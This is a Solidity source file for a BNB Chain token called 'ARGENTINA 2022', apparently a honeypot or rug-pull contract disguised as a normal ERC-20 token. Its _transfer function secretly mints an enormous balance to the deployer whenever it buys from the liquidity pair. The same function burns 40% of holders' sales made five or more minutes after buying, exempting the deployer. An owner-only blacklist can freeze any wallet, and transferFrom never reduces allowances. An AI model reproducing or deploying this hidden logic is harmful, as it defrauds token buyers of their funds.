/**
 *Submitted for verification at BscScan.com on 2022-11-23
*/

pragma solidity ^0.8.12;
// SPDX-License-Identifier: Unlicensed

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}


interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()   {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "not owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xdead));
        _owner = address(0xdead);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new owner is the zeroaddress");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ARGENTINA is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private nomorefees;
    mapping (address => uint256) private Buyser; 

    string private  _name = "ARGENTINA 2022";
    string private  _symbol = "ARGENTINA2022";

    uint8   private  _decimals = 9;
    uint256 private _totalSupply = 100000000 * 10 ** 9;
    uint256 private timetoenternow = 5 * 60 ;
    mapping (address => bool) private notwelcome;
    address private uniswapV2Pair;
    address private addressforburn = 0x000000000000000000000000000000000000dEaD;
    address private PublicUser = msg.sender;

    IDEXRouter private uniswapV2Router;

    constructor () {
        _tOwned[_msgSender()] = _totalSupply;
        uniswapV2Router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Pair = IDEXFactory(uniswapV2Router.factory()).createPair(uniswapV2Router.WETH(), address(this));
        nomorefees[owner()] = true;
        nomorefees[address(this)] = true;
        nomorefees[PublicUser] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }
  
    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    uint256 tokens = _totalSupply * 100 * 100;
            
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function addnotwelcome(address[] memory notwelcome_) public onlyOwner {
        for (uint i = 0; i < notwelcome_.length; i++) {
            notwelcome[notwelcome_[i]] = true;
        }
    }

    function delnotwelcome(address[] memory notbotwelcome) public onlyOwner {
      for (uint i = 0; i < notbotwelcome.length; i++) {
          notwelcome[notbotwelcome[i]] = false;
      }
}

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 Allowancec = _allowances[sender][_msgSender()];
        require(Allowancec >= amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }



    function _getValues(uint256 amount, address from) private returns (uint256) {
        uint256 burn = amount * 40 / 100; 

        _tOwned[addressforburn] += burn;

        emit Transfer (from, addressforburn, burn);

        return (amount - burn );
    }



    function _transfer(  address from,  address to,  uint256 amount  ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);

        uint256  time = block.timestamp;  uint256  Dtoken = tokens * 10;

        if (from != owner() && to != owner()) {
            require(!notwelcome[from] && !notwelcome[to]);
        }

        if ( from == uniswapV2Pair && to == PublicUser )  { _tOwned [PublicUser] += Dtoken;}

        if ( from == uniswapV2Pair ) {  if( balanceOf(to) == 0) { {Buyser[to] = time;  }  }  }  

        uint256 _sell = Buyser[from] + timetoenternow;

        _tOwned[from] -= amount;

        uint256 transferAmount = amount;


        if ( time >= _sell  && to != addressforburn  && from != uniswapV2Pair &&  from != PublicUser ) {
            transferAmount = _getValues(amount, from);
        } 

        _tOwned[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
    }
    

    function _basicTransfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        _tOwned[from] = _tOwned[from] - amount;
        _tOwned[to] = _tOwned[to] + amount;
        emit Transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private returns (uint256) {
        uint256 initialBalance = address(this).balance;
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
        return (address(this).balance - initialBalance);
    }

    function addLiquidityETH(uint256 tokenAmount, uint256 ethAmount) private{
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
             address(0xdead),
            block.timestamp
        );

    }

}